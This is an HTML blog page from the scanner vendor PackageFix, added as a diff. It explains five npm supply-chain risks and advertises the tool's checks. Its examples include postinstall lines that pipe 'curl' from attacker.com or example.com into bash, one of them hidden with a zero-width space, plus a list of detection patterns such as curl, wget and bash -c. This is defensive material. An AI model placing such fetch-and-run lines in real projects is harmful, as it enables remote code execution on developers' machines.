@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>5 Supply Chain Attacks Hiding in Your package.json — PackageFix</title>
+<meta name="description" content="npm audit misses Glassworm Unicode injection, zombie packages, typosquatting, build script injection, and CISA KEV entries. Here's what to look for and how to detect them.">
+<link rel="canonical" href="https://packagefix.dev/blog/supply-chain-attacks-package-json">
+<meta property="og:title" content="5 Supply Chain Attacks Hiding in Your package.json — PackageFix">
+<meta property="og:description" content="npm audit misses Glassworm Unicode injection, zombie packages, typosquatting, build script injection, and CISA KEV entries. Here's what to look for and how to detect them.">
+<meta property="og:url" content="https://packagefix.dev/blog/supply-chain-attacks-package-json">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<link rel="icon" type="image/svg+xml" href="/icon.svg">
+<link rel="icon" type="image/png" sizes="512x512" href="/icon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "Article",
+      "headline": "5 Supply Chain Attacks Hiding in Your package.json Right Now",
+      "description": "npm audit misses Glassworm Unicode injection, zombie packages, typosquatting, build script injection, and CISA KEV entries. Here's what to look for.",
+      "datePublished": "2026-03-22",
+      "dateModified": "2026-03-22",
+      "author": {
+        "@type": "Organization",
+        "name": "MetricLogic",
+        "url": "https://packagefix.dev"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "PackageFix",
+        "url": "https://packagefix.dev"
+      },
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://packagefix.dev/blog/supply-chain-attacks-package-json"
+      }
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "PackageFix",
+          "item": "https://packagefix.dev"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Blog",
+          "item": "https://packagefix.dev/blog"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "Supply Chain Attacks in package.json",
+          "item": "https://packagefix.dev/blog/supply-chain-attacks-package-json"
+        }
+      ]
+    },
+    {
+      "@type": "FAQPage",
+      "mainEntity": [
+        {
+          "@type": "Question",
+          "name": "Does npm audit catch supply chain attacks?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "npm audit only checks CVE databases. It does not detect typosquatting, Unicode injection in scripts, zombie packages with sudden updates, or packages where a maintainer account was compromised. PackageFix adds these checks on top of OSV CVE scanning."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "What is a Glassworm attack?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Glassworm is a supply chain attack technique that embeds invisible Unicode characters (zero-width spaces, variation selectors) in package.json scripts. The script looks clean in a text editor but contains hidden payloads that execute on install. PackageFix detects these by scanning manifest content for non-printable Unicode ranges."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "How do I detect a compromised npm package?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Look for packages that were dormant for 12+ months and then suddenly received an update. This is the fingerprint of a compromised maintainer account. PackageFix flags npm packages that have a long inactivity gap followed by a recent publish."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "What is typosquatting in npm?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Typosquatting is registering a package name one character away from a popular package \u2014 'expres' instead of 'express', 'lodas' instead of 'lodash'. Developers who mistype the package name in npm install end up installing the malicious package. PackageFix checks all package names against a Levenshtein distance of 1 from the top 100 npm packages."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "What is the CISA KEV catalog?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "The CISA Known Exploited Vulnerabilities catalog lists vulnerabilities confirmed to be actively exploited in real attacks. npm packages on this list (lodash, qs, jsonwebtoken, vm2) should be treated as critical-priority fixes regardless of your usual patch schedule."
+          }
+        }
+      ]
+    }
+  ]
+}</script>
+<style>
+:root {
+  --bg:#0B0D14; --surface:#12151F; --surface2:#1A1D2E;
+  --border:#252836; --purple:#6C63FF; --green:#22C55E;
+  --orange:#F97316; --red:#EF4444; --yellow:#EAB308;
+  --text:#E2E4F0; --muted:#6B7280;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.6;min-height:100vh}
+a{color:var(--purple);text-decoration:none}
+a:hover{text-decoration:underline}
+.site-header{border-bottom:1px solid var(--border);padding:14px 24px;display:flex;align-items:center;justify-content:space-between}
+.logo{font-size:15px;font-weight:700;color:var(--text)}
+.logo span{color:var(--purple)}
+.nav-links{display:flex;gap:20px;font-size:12px}
+.nav-links a{color:var(--muted)}
+.nav-links a:hover{color:var(--text);text-decoration:none}
+.container{max-width:860px;margin:0 auto;padding:48px 24px}
+.container-wide{max-width:1000px;margin:0 auto;padding:48px 24px}
+.breadcrumb{font-size:11px;color:var(--muted);margin-bottom:24px;display:flex;gap:6px;flex-wrap:wrap}
+.breadcrumb a{color:var(--muted)}
+h1{font-size:clamp(18px,3vw,28px);font-weight:700;margin-bottom:12px;line-height:1.3}
+h2{font-size:15px;font-weight:600;margin:36px 0 12px}
+h3{font-size:13px;font-weight:600;margin:24px 0 8px;color:var(--text)}
+p{color:var(--muted);margin-bottom:12px;font-size:12px;line-height:1.7}
+.lead{color:var(--text);font-size:13px;margin-bottom:24px;line-height:1.7}
+.kev-banner{background:rgba(239,68,68,.12);border:1px solid var(--red);border-radius:10px;padding:16px 20px;margin:24px 0}
+.kev-banner .label{font-size:10px;font-weight:700;color:var(--red);text-transform:uppercase;letter-spacing:.1em;margin-bottom:6px}
+.kev-banner p{color:var(--red);margin:0;font-size:12px}
+pre{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:14px 16px;overflow-x:auto;font-size:11px;line-height:1.6;margin:8px 0;white-space:pre-wrap}
+code{background:var(--surface);border:1px solid var(--border);border-radius:3px;padding:1px 5px;font-size:11px}
+.cta-box{background:var(--surface);border:1px solid var(--purple);border-radius:10px;padding:24px;margin:32px 0;text-align:center}
+.cta-box p{color:var(--text);font-size:13px;margin-bottom:16px}
+.cta-btn{display:inline-block;background:var(--purple);color:#fff;font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:600;padding:12px 28px;border-radius:7px;text-decoration:none}
+.cta-btn:hover{opacity:.9;text-decoration:none}
+.badge{display:inline-block;font-size:10px;font-weight:700;padding:2px 8px;border-radius:4px;text-transform:uppercase;letter-spacing:.05em}
+.badge-red{background:rgba(239,68,68,.2);color:var(--red);border:1px solid var(--red)}
+.badge-orange{background:rgba(249,115,22,.2);color:var(--orange);border:1px solid var(--orange)}
+.badge-green{background:rgba(34,197,94,.2);color:var(--green);border:1px solid var(--green)}
+.badge-purple{background:rgba(108,99,255,.2);color:var(--purple);border:1px solid var(--purple)}
+.kev-table{width:100%;border-collapse:collapse;margin:16px 0;font-size:12px}
+.kev-table th{text-align:left;padding:10px 12px;border-bottom:1px solid var(--border);color:var(--muted);font-weight:600;font-size:10px;text-transform:uppercase;letter-spacing:.08em}
+.kev-table td{padding:10px 12px;border-bottom:1px solid var(--border);vertical-align:top}
+.kev-table tr:last-child td{border-bottom:none}
+.kev-table tr:hover td{background:var(--surface2)}
+.faq{margin:40px 0}
+.faq-item{border-bottom:1px solid var(--border);padding:16px 0}
+.faq-item:last-child{border-bottom:none}
+.faq-q{font-size:12px;font-weight:600;color:var(--text);margin-bottom:8px}
+.faq-a{font-size:12px;color:var(--muted);line-height:1.7}
+.related-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;margin-top:12px}
+.related-card{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:14px}
+.related-card a{color:var(--text);font-size:12px;font-weight:500}
+.related-card p{font-size:11px;color:var(--muted);margin:4px 0 0}
+.vs-row{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin:20px 0}
+.vs-col{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:16px}
+.vs-col h3{margin:0 0 12px;font-size:12px}
+.vs-col ul{padding-left:16px;color:var(--muted);font-size:12px;line-height:1.8}
+.attack-card{background:var(--surface);border:1px solid var(--border);border-left:3px solid var(--red);border-radius:8px;padding:16px 20px;margin:20px 0}
+.attack-card h3{color:var(--text);margin:0 0 8px;font-size:13px}
+.attack-card p{margin:0;font-size:12px}
+.blog-meta{color:var(--muted);font-size:11px;margin-bottom:32px;display:flex;gap:16px;flex-wrap:wrap}
+.site-footer{border-top:1px solid var(--border);padding:24px;text-align:center;font-size:11px;color:var(--muted);margin-top:60px}
+.site-footer a{color:var(--muted)}
+@media(max-width:640px){.nav-links{display:none}.related-grid{grid-template-columns:1fr}.vs-row{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<header class="site-header">
+  <a href="https://packagefix.dev" class="logo">Package<span>Fix</span></a>
+  <nav class="nav-links">
+    <a href="https://packagefix.dev">Tool</a>
+    <a href="https://packagefix.dev/alternatives">Alternatives</a>
+    <a href="https://packagefix.dev/cisa-kev">CISA KEV</a>
+    <a href="https://packagefix.dev/error">Error Fixes</a>
+    <a href="https://github.com/metriclogic26/packagefix">GitHub</a>
+  </nav>
+</header>
+<main class="container">
+  <div class="breadcrumb"><a href="/">PackageFix</a> <span style='color:var(--border)'>/</span> <a href="/blog">Blog</a> <span style='color:var(--border)'>/</span> <span style="color:var(--text)">Supply Chain Attacks in package.json</span></div>
+  
+<h1>5 Supply Chain Attacks Hiding in Your package.json Right Now</h1>
+<div class="blog-meta">
+  <span>March 22, 2026</span>
+  <span>·</span>
+  <span>MetricLogic / PackageFix</span>
+  <span>·</span>
+  <span>8 min read</span>
+</div>
+
+<p class="lead">npm audit tells you about CVEs. It doesn't tell you about the package that went dormant for 14 months and just pushed an update. It doesn't tell you about the invisible Unicode character in your postinstall script. It doesn't tell you that one of your dependencies is one character away from a known malware package. Here's what npm audit misses — and how to detect it.</p>
+
+<h2>1. Glassworm — Invisible Unicode in Your Scripts</h2>
+
+<div class="attack-card">
+  <h3>Attack type: Script injection · Detection: PackageFix Unicode scan</h3>
+  <p>A compromised package embeds invisible Unicode characters (zero-width spaces, variation selectors U+FE00–U+FE0F) in npm scripts. The script looks clean in your editor. To the shell, it contains a hidden payload.</p>
+</div>
+
+<p>This is not theoretical. The Glassworm campaign (March 2026) actively used Unicode variation selectors in npm postinstall scripts. The attack is invisible to code review because most editors either don't render these characters or render them identically to their visible equivalents.</p>
+
+<p>What your package.json looks like in your editor:</p>
+<pre>"postinstall": "node setup.js"</pre>
+
+<p>What it actually contains (revealed in a hex editor):</p>
+<pre>"postinstall": "node​ setup.js && curl https://attacker.com/payload.sh | bash"</pre>
+
+<p>The zero-width space (U+200B) is invisible. The shell executes the entire string.</p>
+
+<p><strong>How to detect it:</strong> Paste your package.json into PackageFix. It scans all manifest content for invisible Unicode ranges before parsing. If found, a red banner appears: "Invisible Unicode characters detected — do not use this manifest."</p>
+
+<h2>2. The Zombie Package — Dormant Then Suddenly Updated</h2>
+
+<div class="attack-card">
+  <h3>Attack type: Compromised maintainer · Detection: PackageFix suspicious package flag</h3>
+  <p>A package hasn't been updated in 18 months. The maintainer's npm account gets compromised. A malicious version is published. The package has millions of weekly downloads. Every project that runs npm install gets the payload.</p>
+</div>
+
+<p>This is how the event-stream attack worked in 2018. The maintainer handed off the package to a stranger who published a malicious version. In 2024–2026, this attack pattern has accelerated — compromised maintainer accounts are actively targeted because they provide instant distribution to millions of installs.</p>
+
+<p>npm audit won't flag this. The malicious version may have no CVE yet — CVEs are assigned after discovery, not before. By the time a CVE is assigned, the attack has already run on thousands of machines.</p>
+
+<p><strong>How to detect it:</strong> PackageFix fetches the npm registry's time.modified and version history for each package. If a package was dormant for more than 24 months and received an update within the last 72 hours with more than 100,000 weekly downloads, it's flagged with a 🧟 ZOMBIE badge: "Updated 4 hours ago after 18 months of inactivity. May indicate a compromised maintainer account."</p>
+
+<h2>3. Typosquatting — One Character Away from Disaster</h2>
+
+<div class="attack-card">
+  <h3>Attack type: Package name confusion · Detection: PackageFix Levenshtein check</h3>
+  <p>An attacker registers "expres" on npm. A developer types npm install expres (missing the s). The malicious package installs. postinstall runs. Credentials exfiltrated.</p>
+</div>
+
+<p>Typosquatting attacks on npm are continuous. The npm registry has no automatic protection against names that are one character away from popular packages. Every year, security researchers discover hundreds of typosquatted packages — many with postinstall scripts that exfiltrate environment variables.</p>
+
+<p>Common targets: express → expres, lodash → lodas, react → reacts, webpack → webpak, axios → axois.</p>
+
+<p><strong>How to detect it:</strong> PackageFix runs a Levenshtein distance check against a hardcoded list of the top 100 npm packages for every dependency name in your manifest. A distance of 1 triggers a ⚠ TYPOSQUAT? badge: "Similar to express — verify this is the correct package."</p>
+
+<h2>4. Build Script Injection — curl in Your postinstall</h2>
+
+<div class="attack-card">
+  <h3>Attack type: Arbitrary code execution · Detection: PackageFix build script scan</h3>
+  <p>A dependency's postinstall script contains curl https://example.com/setup.sh | bash. This runs automatically when you npm install. You never see it unless you read every package's package.json in node_modules.</p>
+</div>
+
+<p>Legitimate packages sometimes use postinstall scripts (native module compilation, binary downloads). Malicious packages use them for code execution. The difference isn't always obvious from the package name or description.</p>
+
+<p>npm does not warn you when a postinstall script contains network calls. npm install just runs it.</p>
+
+<p><strong>How to detect it:</strong> PackageFix scans all scripts fields in your package.json for dangerous patterns: curl, wget, sh -c, bash -c, python -c, eval. If found, an orange banner appears: "Build script contains network or shell commands — review before proceeding" with the exact script content shown.</p>
+
+<h2>5. The CISA KEV Package — Actively Exploited Right Now</h2>
+
+<div class="attack-card">
+  <h3>Attack type: Known CVE exploitation · Detection: PackageFix CISA KEV flag</h3>
+  <p>Your package.json has lodash 4.17.15. CVE-2020-8203 (prototype pollution) is in the CISA Known Exploited Vulnerabilities catalog — meaning it's being used in real attacks against real systems right now. npm audit flags it as HIGH. What npm audit doesn't tell you: this one is in the wild.</p>
+</div>
+
+<p>The CVE database contains tens of thousands of vulnerabilities. The CISA KEV catalog contains the ones that are actually being exploited. The distinction matters for prioritization — you can't fix everything immediately, but you should fix the KEV entries immediately.</p>
+
+<p>npm packages on the current CISA KEV list: lodash, qs, jsonwebtoken, minimist, vm2, axios, follow-redirects, sharp.</p>
+
+<p><strong>How to detect it:</strong> PackageFix checks every scanned package against the live CISA KEV catalog. KEV packages get a red 🔴 dot in the CVE table and appear in the ACTIVELY EXPLOITED banner at the top of results.</p>
+
+<h2>How to Check Your package.json Right Now</h2>
+
+<p>All 5 attack vectors are checked automatically when you paste your package.json into PackageFix:</p>
+<ol style="padding-left:20px;margin:12px 0 20px;color:var(--muted);font-size:12px;line-height:2">
+  <li>Open <a href="https://packagefix.dev">packagefix.dev</a></li>
+  <li>Paste your package.json (drop package-lock.json too for transitive scanning)</li>
+  <li>Click Scan Dependencies</li>
+  <li>Check the results: CVE table, CISA KEV banner, ZOMBIE badges, TYPOSQUAT warnings, build script alerts</li>
+  <li>Download the fixed package.json if any CVEs are found</li>
+</ol>
+
+<div class="cta-box">
+  <p>Scan your dependencies now — paste your manifest, get a fixed version back in seconds.</p>
+  <a href="https://packagefix.dev" class="cta-btn">Open PackageFix →</a>
+  <p style="margin-top:12px;font-size:11px;color:var(--muted)">No signup · No CLI · No GitHub · Runs 100% in your browser</p>
+</div>
+
+<h2>The Uncomfortable Truth About npm audit</h2>
+<p>npm audit is a good tool. It catches known CVEs reliably and it's built into the npm workflow. But it was designed for a 2018 threat model where the main risk was unpatched dependencies with known CVEs.</p>
+<p>The 2026 threat model includes compromised maintainer accounts, invisible Unicode payloads, typosquatting at scale, and malicious build scripts. npm audit doesn't check for any of these — and it was never designed to.</p>
+<p>PackageFix is not a replacement for npm audit. It's the layer that catches what npm audit misses. Run both.</p>
+
+<div class="faq"><h2>Frequently Asked Questions</h2><div class="faq-item"><div class="faq-q">Does npm audit catch supply chain attacks?</div><div class="faq-a">npm audit only checks CVE databases. It does not detect typosquatting, Unicode injection in scripts, zombie packages with sudden updates, or packages where a maintainer account was compromised. PackageFix adds these checks on top of OSV CVE scanning.</div></div><div class="faq-item"><div class="faq-q">What is a Glassworm attack?</div><div class="faq-a">Glassworm is a supply chain attack technique that embeds invisible Unicode characters (zero-width spaces, variation selectors) in package.json scripts. The script looks clean in a text editor but contains hidden payloads that execute on install. PackageFix detects these by scanning manifest content for non-printable Unicode ranges.</div></div><div class="faq-item"><div class="faq-q">How do I detect a compromised npm package?</div><div class="faq-a">Look for packages that were dormant for 12+ months and then suddenly received an update. This is the fingerprint of a compromised maintainer account. PackageFix flags npm packages that have a long inactivity gap followed by a recent publish.</div></div><div class="faq-item"><div class="faq-q">What is typosquatting in npm?</div><div class="faq-a">Typosquatting is registering a package name one character away from a popular package — 'expres' instead of 'express', 'lodas' instead of 'lodash'. Developers who mistype the package name in npm install end up installing the malicious package. PackageFix checks all package names against a Levenshtein distance of 1 from the top 100 npm packages.</div></div><div class="faq-item"><div class="faq-q">What is the CISA KEV catalog?</div><div class="faq-a">The CISA Known Exploited Vulnerabilities catalog lists vulnerabilities confirmed to be actively exploited in real attacks. npm packages on this list (lodash, qs, jsonwebtoken, vm2) should be treated as critical-priority fixes regardless of your usual patch schedule.</div></div></div>
+
+<div style="margin:40px 0">
+  <h2>Related Guides</h2>
+  <div class="related-grid">
+    <div class="related-card"><a href="/fix/npm/lodash">Fix Lodash CVE-2020-8203</a><p>CISA KEV — prototype pollution</p></div>
+    <div class="related-card"><a href="/fix/npm/vm2">Fix vm2 CVE-2023-29017</a><p>CISA KEV — sandbox escape RCE</p></div>
+    <div class="related-card"><a href="/cisa-kev">CISA KEV Package List</a><p>All actively exploited packages</p></div>
+    <div class="related-card"><a href="/npm">npm Security Overview</a><p>All npm vulnerability guides</p></div>
+  </div>
+</div>
+
+</main>
+<footer class="site-footer">
+  <p>PackageFix · <a href="https://packagefix.dev">packagefix.dev</a> · MIT Licensed · Open Source</p>
+  <p style="margin-top:6px">Part of the MetricLogic network ·
+  <a href="https://configclarity.dev">ConfigClarity</a> ·
+  <a href="https://domainpreflight.dev">DomainPreflight</a></p>
+  <p style="margin-top:6px">Vulnerability data: <a href="https://osv.dev">OSV Database</a> · <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">CISA KEV Catalog</a></p>
+  <p style="margin-top:6px">Always test dependency updates in a staging environment before deploying to production.</p>
+</footer>
+</body>
+</html>
